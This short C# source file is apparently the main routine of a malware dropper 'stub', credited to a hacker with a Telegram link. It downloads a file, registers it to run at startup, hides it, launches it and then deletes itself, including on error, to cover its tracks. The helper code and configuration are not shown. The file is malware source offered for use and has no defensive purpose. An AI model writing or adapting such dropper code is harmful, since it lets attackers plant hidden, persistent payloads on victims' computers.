// Main-Functions file
// Coded by GhostHacker - Telegram | https://t.me/GhostHackersNetwork

using System.Diagnostics;

namespace Stub.Modules.InternalFuncs
{
    internal class InternalMain
    {
        public static void Execute()
        {
            try
            {
                InternalAux.DownloadFile();

                if (config.AutoRun)
                {
                    InternalAux.AddToAutoRun("XxX", config.FileLocation);
                }

                if (config.HideFile)
                {
                    InternalAux.HideFile(config.FileLocation);
                }

                Process.Start(config.FileLocation);
                InternalAux.SelfRemove();
            }

            catch { InternalAux.SelfRemove(); }


        }
    }
}
